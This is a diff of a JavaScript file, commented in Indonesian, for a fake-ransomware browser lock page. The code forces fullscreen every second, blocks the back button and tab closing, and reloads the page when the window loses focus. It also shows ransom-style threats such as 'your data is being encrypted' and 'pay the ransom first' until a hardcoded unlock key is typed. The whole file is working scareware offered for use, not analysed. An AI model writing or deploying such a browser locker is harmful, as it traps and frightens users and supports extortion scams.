@@ -1,41 +1,3 @@
-document.addEventListener("keydown", function(event) {
-    event.preventDefault(); // Mencegah pengguna keluar dengan tombol keyboard
-});
-
-window.addEventListener("beforeunload", function (event) {
-    event.returnValue = "⚠️ Your files will be lost if you leave! ⚠️";
-});
-
-function checkKey() {
-    let key = document.getElementById("keyInput").value;
-    let correctKey = "12092010"; // Ganti dengan key yang kamu mau
-
-    if (key === correctKey) {
-        alert("✅ System Unlocked!");
-        window.location.href = "https://google.com"; // Bisa diarahkan ke mana saja
-    } else {
-        alert("❌ WRONG KEY! Your system is still locked!");
-    }
-}
-
-// Aktifkan Fullscreen saat halaman dimuat
-document.addEventListener("DOMContentLoaded", function() {
-    if (document.documentElement.requestFullscreen) {
-        document.documentElement.requestFullscreen();
-    }
-});
-
-// Blokir tombol kembali
-history.pushState(null, null, location.href);
-window.onpopstate = function () {
-    history.pushState(null, null, location.href);
-    alert("Tidak bisa kembali! Tebusan dulu!");
-};
-
-// Cegah menutup tab
-window.onbeforeunload = function () {
-    return "Data Anda sedang dienkripsi! Yakin ingin keluar?";
-};
 
 // Paksa Fullscreen jika keluar
 function forceFullscreen() {
@@ -45,21 +7,44 @@ function forceFullscreen() {
 }
 setInterval(forceFullscreen, 1000);
 
-// Blokir semua gesture keluar dengan overlay transparan
-let overlay = document.createElement("div");
-overlay.style.position = "fixed";
-overlay.style.top = "0";
-overlay.style.left = "0";
-overlay.style.width = "100%";
-overlay.style.height = "100%";
-overlay.style.zIndex = "9999";
-overlay.style.background = "rgba(0,0,0,0)";
-document.body.appendChild(overlay);
+// Blokir tombol kembali dan keluar
+history.pushState(null, null, location.href);
+window.onpopstate = function () {
+    history.pushState(null, null, location.href);
+    alert("Tidak bisa kembali! Masukkan key untuk keluar!");
+};
 
-// Cegah refresh atau pindah tab dengan loop peringatan
+// Cegah refresh atau pindah tab
 document.addEventListener("visibilitychange", function() {
     if (document.hidden) {
-        alert("Jangan coba-coba kabur!");
+        alert("Jangan coba kabur! Masukkan key untuk keluar!");
         location.reload();
     }
+});
+
+// Blokir tombol home & recent apps (terbatas di web)
+window.addEventListener("blur", function() {
+    setTimeout(function() {
+        alert("Tidak bisa keluar begitu saja! Masukkan key!");
+        location.reload();
+    }, 100);
+});
+
+// Cek input key untuk bisa keluar
+function checkKey() {
+    let inputKey = document.getElementById("ransomKey").value;
+    if (inputKey === "unlock123") {
+        alert("Key benar! Anda bebas!");
+        window.onbeforeunload = null;  // Hapus blok keluar
+        document.exitFullscreen();  // Keluar dari fullscreen
+        history.back();  // Kembali ke halaman sebelumnya
+    } else {
+        alert("Key salah! Anda tetap terkunci!");
+    }
+}
+
+// Tambahkan event listener ke tombol unlock
+document.addEventListener("DOMContentLoaded", function() {
+    let unlockButton = document.getElementById("unlockButton");
+    if (unlockButton) unlockButton.addEventListener("click", checkKey);
 });
